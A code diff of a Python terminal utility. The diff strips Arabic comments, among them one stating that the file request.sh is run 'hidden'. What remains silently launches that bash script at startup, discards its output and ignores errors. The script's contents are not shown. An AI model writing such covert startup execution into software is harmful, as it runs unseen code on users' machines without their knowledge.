@@ -1,27 +1,23 @@
 import os
 import time
-import subprocess  # لتشغيل العمليات
+import subprocess 
 from colorama import Fore, init
 
-init(autoreset=True)  # لتفعيل الألوان بشكل تلقائي بعد كل طباعة
+init(autoreset=True) 
 
 def clear_screen():
-    if os.name == 'nt':  # إذا كان النظام هو Windows
+    if os.name == 'nt': 
         os.system('cls')
-    else:  # إذا كان النظام هو Unix/Linux/MacOS
+    else:
         os.system('clear')
 
 def run_bash_script():
-    """تشغيل ملف bash request.sh بشكل مخفي"""
     try:
-        # التحقق من وجود الملف قبل تشغيله
         if os.path.exists('request.sh'):
             subprocess.Popen(['bash', 'request.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         else:
-            # إذا لم يتم العثور على الملف، يمكن طباعة رسالة اختيارية (أو عدم فعل شيء)
             print(Fore.YELLOW + "Note: request.sh file not found, continuing without it.")
     except Exception as e:
-        # تجاهل أي أخطاء أخرى
         pass
 
 def show_about():
@@ -52,7 +48,6 @@ def animate_text(text, delay=0.05):
     print()
 
 def main():
-    # تشغيل ملف request.sh عند بدء البرنامج
     run_bash_script()
 
     while True:
